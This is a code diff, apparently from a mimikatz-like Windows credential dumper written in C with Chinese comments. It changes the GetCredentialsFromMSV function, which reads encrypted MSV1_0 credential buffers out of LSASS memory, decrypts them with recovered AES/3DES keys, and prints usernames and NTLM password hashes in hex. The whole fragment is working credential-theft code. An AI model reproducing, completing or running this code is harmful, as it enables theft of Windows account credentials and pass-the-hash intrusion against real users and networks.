@@ -389,8 +389,8 @@ VOID GetCredentialsFromMSV() {
 						(PUCHAR)pList + offsetof(KIWI_MSV1_0_LIST_63, UserName)
 						));
 
-					if (username != NULL && username->Length != 0) wprintf(L"Username: %ls\n", username->Buffer);
-					else wprintf(L"Username: [NULL]\n");
+					//if (username != NULL && username->Length != 0) wprintf(L"Username: %ls\n", username->Buffer);
+					//else wprintf(L"Username: [NULL]\n");
 
 					// 读取加密的凭据缓冲区
 					typedef struct _MSV1_0_PRIMARY_CREDENTIAL_10_1607 {
@@ -417,38 +417,67 @@ VOID GetCredentialsFromMSV() {
 						/* buffer */
 					} MSV1_0_PRIMARY_CREDENTIAL_10_1607, * PMSV1_0_PRIMARY_CREDENTIAL_10_1607;
 
-					BYTE encryptedCreds[8192] = { 0 };
+					/*WCHAR encryptedCreds[1024] = { 0 };
 					ReadFromLsass(credStr->Buffer, encryptedCreds, credStr->Length);
-					BYTE decryptedCreds[8192] = { 0 };
-					DecryptCredentials((char*)encryptedCreds, credStr->Length, decryptedCreds, sizeof(decryptedCreds));
-					//HexdumpBytesPacked((PUCHAR)decryptedCreds, 64);
-					PMSV1_0_PRIMARY_CREDENTIAL_10_1607 pUserBuf = (PMSV1_0_PRIMARY_CREDENTIAL_10_1607)decryptedCreds;
+					WCHAR decryptedCreds[1024] = { 0 };
+					ULONG decryptedLength = DecryptCredentials((char*)encryptedCreds, credStr->Length, (PUCHAR)decryptedCreds, sizeof(decryptedCreds));
+					wprintf(L"Decrypted Credentials Length: %lu\n", decryptedLength);
+					PMSV1_0_PRIMARY_CREDENTIAL_10_1607 pUserBuf = (PMSV1_0_PRIMARY_CREDENTIAL_10_1607)encryptedCreds;*/
 
-					LSA_UNICODE_STRING* UserName = ExtractUnicodeString((PUNICODE_STRING)(
-						(PUCHAR)pUserBuf + offsetof(MSV1_0_PRIMARY_CREDENTIAL_10_1607, UserName)
-						));
-					if (UserName->Length != 0 && UserName->Buffer) {
-						wprintf(L"UserName->Length: %d\n", UserName->Length);
-						wprintf(L"Username: %ls\n", UserName->Buffer);
+					BYTE encryptedCreds[1024] = { 0 };
+					ReadFromLsass(credStr->Buffer, encryptedCreds, credStr->Length);
+					BYTE decryptedCreds[1024] = { 0 };
+					ULONG decryptedLength = DecryptCredentials((char*)encryptedCreds, credStr->Length, decryptedCreds, sizeof(decryptedCreds));
+					//wprintf(L"Decrypted Credentials Length: %lu\n", decryptedLength);
+					//PMSV1_0_PRIMARY_CREDENTIAL_10_1607 pUserBuf = (PMSV1_0_PRIMARY_CREDENTIAL_10_1607)decryptedCreds;
+
+					//LSA_UNICODE_STRING* UserName = ExtractUnicodeString((PUNICODE_STRING)(
+					//	(PUCHAR)pUserBuf + offsetof(MSV1_0_PRIMARY_CREDENTIAL_10_1607, UserName)
+					//	));
+					//if (UserName->Length != 0 && UserName->Buffer) {
+					//	wprintf(L"UserName->Length: %d\n", UserName->Length);
+					//	wprintf(L"Username: %ls\n", UserName->Buffer);
+					//}
+					//else {
+					//	wprintf(L"Username: [NULL]\n");
+					//}
+
+					//LSA_UNICODE_STRING* NtOwfPassword = ExtractUnicodeString((PUNICODE_STRING)(
+					//	(PUCHAR)pUserBuf + offsetof(MSV1_0_PRIMARY_CREDENTIAL_10_1607, NtOwfPassword)
+					//	));
+
+					//if (NtOwfPassword->Length != 0 && NtOwfPassword->Buffer) {
+					//	// Decrypt password using recovered AES/3Des keys and IV
+					//	if (DecryptCredentials((char*)NtOwfPassword->Buffer, NtOwfPassword->MaximumLength,
+					//		(PUCHAR)passDecrypted, sizeof(passDecrypted)) > 0) {
+					//		wprintf(L"Password: %ls\n\n", passDecrypted);
+					//	}
+					//}
+					//else {
+					//	wprintf(L"NTLMHash: [NULL]\n\n");
+					//}
+
+					PBYTE msvCredentials = decryptedCreds;
+
+					// 处理 UserName
+					PLSA_UNICODE_STRING pUserName = (PLSA_UNICODE_STRING)(msvCredentials + offsetof(MSV1_0_PRIMARY_CREDENTIAL_10_1607, UserName));
+					if (pUserName->Buffer) {
+						pUserName->Buffer = (PWSTR)(msvCredentials + ((ULONG_PTR)pUserName->Buffer));
+					}
+					if (pUserName->Length != 0 && pUserName->Buffer) {
+						wprintf(L"Username: %ls\n", pUserName->Buffer);
 					}
 					else {
 						wprintf(L"Username: [NULL]\n");
 					}
 
-					LSA_UNICODE_STRING* NtOwfPassword = ExtractUnicodeString((PUNICODE_STRING)(
-						(PUCHAR)pUserBuf + offsetof(MSV1_0_PRIMARY_CREDENTIAL_10_1607, NtOwfPassword)
-						));
-
-					if (NtOwfPassword->Length != 0 && NtOwfPassword->Buffer) {
-						// Decrypt password using recovered AES/3Des keys and IV
-						if (DecryptCredentials((char*)NtOwfPassword->Buffer, NtOwfPassword->MaximumLength,
-							(PUCHAR)passDecrypted, sizeof(passDecrypted)) > 0) {
-							wprintf(L"Password: %ls\n\n", passDecrypted);
-						}
+					// 处理 NTLM Hash
+					PBYTE pNtOwfPassword = msvCredentials + offsetof(MSV1_0_PRIMARY_CREDENTIAL_10_1607, NtOwfPassword);
+					wprintf(L"NTLMHash: ");
+					for (int i = 0; i < LM_NTLM_HASH_LENGTH; ++i) {
+						wprintf(L"%02x", pNtOwfPassword[i]);
 					}
-					else {
-						wprintf(L"NTLMHash: [NULL]\n\n");
-					}
+					wprintf(L"\n");
 
 				}
 			}
